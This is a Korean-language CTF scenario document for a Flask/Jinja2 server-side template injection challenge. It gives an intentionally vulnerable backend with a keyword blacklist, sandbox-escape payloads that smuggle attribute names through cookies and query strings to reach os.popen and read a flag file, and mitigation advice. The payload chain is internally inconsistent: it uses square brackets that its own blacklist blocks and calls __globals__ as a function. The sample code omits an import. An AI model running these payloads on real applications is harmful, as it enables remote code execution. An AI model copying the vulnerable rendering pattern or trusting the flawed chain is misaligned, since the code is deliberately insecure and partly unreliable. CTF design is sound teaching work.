---
title: SSTI & Python Jinja2 Sandbox Escape — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, ssti, sandbox-escape, rce, jinja2]
confidence: high
---

# SSTI & Python Jinja2 Sandbox Escape — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Custom Mailer Service (개인화 메일 발송기)
- **난이도**: Medium-High
- **핵심 컨셉**: 파이썬 Flask 웹 프레임워크와 Jinja2 템플릿 엔진을 활용한 **서버 사이드 템플릿 인젝션(SSTI)** 문제입니다. 사용자는 메일 본문에 들어갈 내용을 정의하고 `{{ user.name }}`과 같은 변수를 매핑하여 메일을 전송할 수 있습니다. 템플릿 렌더링 시 사용자의 입력 값이 안전하지 않게 포맷팅(문자열 포맷팅)된 상태에서 템플릿 컴파일 과정을 거치므로 SSTI 취약점이 발생합니다. 공격자는 정밀하게 설계된 차단 규칙(블랙리스트 기반 필터)을 피해 파이썬 내부 객체를 탐색(Sandbox Escape)하고 RCE를 유발해야 합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend**: 메일 수신인, 제목, 템플릿 본문을 작성하여 발송을 테스트하는 웹 대화창.
- **Backend Service (Python/Flask)**: 
  - 메일 템플릿 엔진으로 Jinja2를 내장.
  - 사용자가 전송한 `template_content`에 대한 필터 검사(정규표현식 매칭) 수행 후 렌더링.
- **Flag 위치**:
  - 서버 파일 시스템 내 임의 명칭의 파일: `/app/flag_is_here_xyz.txt` (명령 실행을 통해 파일을 찾아 읽어야 함).

### 2.2 취약점 지점
1. **Unsafe Template Rendering (SSTI)**:
   - 개발자가 사용자 입력 메시지 자체에 파이썬 포맷 스트링 또는 문자열 연결을 적용해 Jinja2 템플릿 객체를 동적으로 생성합니다.
   - 예: `render_template_string("Hello " + user_input)`
2. **Weak Sandbox Regex Bypass**:
   - 보안 검증 로직으로 입력값 내에 `class`, `mro`, `subclasses`, `import`, `os`, `system`, `popen` 및 큰따옴표(`"`), 작은따옴표(`'`), 대괄호(`[` 및 `]`)가 발견되면 에러를 리턴합니다.
   - 공격자는 필터링되는 문자열을 우회하기 위해 **Jinja2 내장 필터(Format, Join 등)**와 **속성 탐색 우회 방법(request, attr, `__getattribute__` 등)**을 결합하여 샌드박스를 우회해야 합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Body) | 반환 값 | 비고 |
|------------|--------|------|----------------|---------|------|
| `/mailer` | GET | 없음 | 없음 | 메일 작성 폼 HTML | |
| `/api/send`| POST | 없음 | `{"template": "사용자 입력 내용", "to": "..."}` | 렌더링된 메일 본문 결과 또는 에러 메세지 | SSTI 발생 위치 및 우회 테스트 대상 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 취약점 판별
템플릿 입력란에 기본적인 수식을 입력해 실행 결과를 확인합니다.
- *입력*: `{{ 7 * 7 }}`
- *반환*: `49` (SSTI 취약점 존재 확인)

### Step 2. 샌드박스 필터 확인 및 우회 설계
단순한 샌드박스 탈출 페이로드(예: `{{ ''.__class__.__mro__[1] }}`)를 시도하면, 서버의 방화벽/필터링 코드에 걸려 "Insecure payload detected" 에러가 리턴됩니다.
- **우회 제한 사항**: `class`, `mro`, `subclasses`, `import`, `os`, `system`, `popen`, `"`, `'`, `[`, `]` 사용 불가.

- **우회 기법**:
  1. **따옴표 우회**: 파이썬의 `request.args`나 `request.cookies`를 이용하여 공격 구문(예: `'__class__'`)을 쿼리스트링이나 쿠키 헤더로 전송해 참조합니다.
     - 예: `{{ request.args.param }}`을 치고 URL 뒤에 `?param=__class__` 추가.
  2. **대괄호 우회**: `.__getitem__(...)` 또는 `getattr(...)`, `attr(...)`을 활용합니다.
  3. **속성 접근**: `request|attr(request.args.c)` 형태를 활용하여 속성을 동적으로 탐색합니다.

### Step 3. 샌드박스 탈출 페이로드 구성 및 명령 실행 (RCE)
공격자는 서버의 빌트인 모듈을 탐색해 `os.popen`을 가져오고 명령을 실행합니다.
- **최종 페이로드 조합**:
  - `http://challenge.local/api/send`에 POST로 `template` 인자 전달:
    ```html
    {{ (request|attr(request.args.c1))|attr(request.args.c2) }}
    ```
  - GET 파라미터로 속성 값 전달 (필터링 필하기):
    `?c1=__class__&c2=__base__`  => 결과: `<class 'object'>` 확인.

  - 객체 서브클래스에서 `sys.modules`나 특정 클래스를 찾아 원격 코드 실행을 트리거합니다. 파이썬 `object` 자식 중 `sys` 관련 모듈이나 `popen`을 가지고 있는 클래스를 탐색합니다. (예: `warnings.catch_warnings` 등)
  - 쿠키와 URL 파라미터를 조합한 원격 실행 명령 페이로드:
    ```html
    {{ request|attr(request.cookies.c1)|attr(request.cookies.c2)|attr(request.cookies.c3)()[request.cookies.idx|int]|attr(request.cookies.c4)(request.cookies.cmd)|attr(request.cookies.c5)() }}
    ```
    - **Cookies 세팅**:
      - `c1` = `__class__`
      - `c2` = `__init__`
      - `c3` = `__globals__`
      - `idx` = (인덱스 위치, 예: `__globals__` 내의 `sys` 관련 라이브러리)
      - `c4` = `popen` (혹은 `os`를 임포트해 가져올 수 있는 모듈)
      - `cmd` = `cat /app/flag_is_here_xyz.txt`
      - `c5` = `read`

### Step 4. flag 획득
서버는 이 페이로드를 해석하여 메모리 상에서 `os.popen("cat /app/flag_is_here_xyz.txt").read()`를 실행하고, 그 결과값(플래그)을 메일 미리보기 응답으로 화면에 출력하게 됩니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Flask)

```python
# app.py
from flask import Flask, request, render_template_string
import re

app = Flask(__name__)

# 정교한(그러나 불충분한) 블랙리스트 규칙
BLACKLIST = [
    r"class", r"mro", r"subclasses", r"import", r"os", r"system", r"popen",
    r"\"", r"\'", r"\[", r"\]"
]

def check_security(payload):
    # 블랙리스트에 매핑되는 위협 단어가 포함되어 있으면 에러 처리
    for rule in BLACKLIST:
        if re.search(rule, payload, re.IGNORECASE):
            return False
    return True

@app.route("/api/send", methods=["POST"])
def send_mail():
    data = request.get_json()
    template = data.get("template", "")
    
    if not check_security(template):
        return jsonify({"error": "Insecure payload detected!"}), 400
        
    # 취약점: 문자열 포맷팅을 통해 사용자 입력을 템플릿 템플릿 컴파일러로 직접 전달
    # 안전하게 하려면 render_template_string("Hello {{ name }}", name=user_input)처럼 해야함
    try:
        rendered = render_template_string(template)
        return jsonify({"status": "success", "result": rendered})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **안전한 렌더링 컨텍스트 사용 (Strict Rendering)**:
   - 사용자가 전송한 입력을 템플릿 구문(소스 코드)으로 처리하지 마십시오. 반드시 플레이스홀더를 고정하고 파라미터 바인딩을 적용해야 합니다.
   - **올바른 예시**: `render_template_string("Hello {{ name }}", name=user_input)`
2. **화이트리스트 기반 입력 필터링**:
   - 템플릿이 꼭 동적으로 생성되어야 하는 드문 경우라면, 알파벳과 숫자, 극히 일부 특수 기호만 허용하는 화이트리스트 검증을 엄격히 적용합니다.
3. **템플릿 전용 안전 샌드박스 활성화**:
   - Jinja2의 `SandboxedEnvironment`를 사용하여 위험한 내부 클래스 속성이나 메서드 호출을 강제로 금지시킵니다.
